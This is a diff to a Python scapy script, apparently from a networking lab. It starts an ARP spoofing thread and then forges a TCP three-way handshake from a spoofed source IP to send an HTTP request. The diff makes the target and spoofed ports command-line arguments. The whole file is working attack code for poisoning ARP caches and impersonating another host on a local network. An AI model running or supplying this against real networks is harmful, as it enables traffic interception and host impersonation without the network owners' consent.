@@ -1,8 +1,8 @@
 from scapy.all import *
 import _thread
-def tcp(h,d,s):
+def tcp(h,d,s,sp,dp):
 #产生SYN包（FLAG = S 为SYN）
-    ret = sr(IP(src=s,dst=d)/TCP(dport=8090,sport=9000,flags='S',seq=17), verbose = False)
+    ret = sr(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags='S',seq=17), verbose = False)
     #响应的数据包产生数组([0]为响应，[1]为未响应)
     list = ret[0].res
     #第一层[0]位第一组数据包
@@ -16,8 +16,8 @@ def tcp(h,d,s):
     print(cs_sn)
 
     #发送ACK(flag = A),完成三次握手！
-    send(IP(src=s,dst=d)/TCP(dport=8090,sport=9000,flags='A',seq=cs_sn,ack=sc_sn), verbose = False)
-    send(IP(src=s,dst=d)/TCP(dport=8090,sport=9000,flags=24,seq=cs_sn,ack=sc_sn)/'12345', verbose = False)
+    send(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags='A',seq=cs_sn,ack=sc_sn), verbose = False)
+    send(IP(src=s,dst=d)/TCP(dport=dp,sport=sp,flags=24,seq=cs_sn,ack=sc_sn)/'GET / HTTP/1.1\r\n', verbose = False)
 
 # use scapy to arpspoof
 #!/usr/bin/env python3
@@ -78,7 +78,7 @@ if __name__ == '__main__':
     try:
         _thread.start_new_thread(arpspoof, (argv[1], argv[2], argv[3],))
         time.sleep(1)
-        tcp(argv[1], argv[2], argv[3])
+        tcp(argv[1], argv[2], argv[3],int(argv[4]),int(argv[5]))
     except IndexError:
-        print("Usage: arpspoof.py <interface> <target> <spoof>")
+        print("Usage: arpspoof.py <interface> <target> <spoof> <targetport> <spoofport>")
 
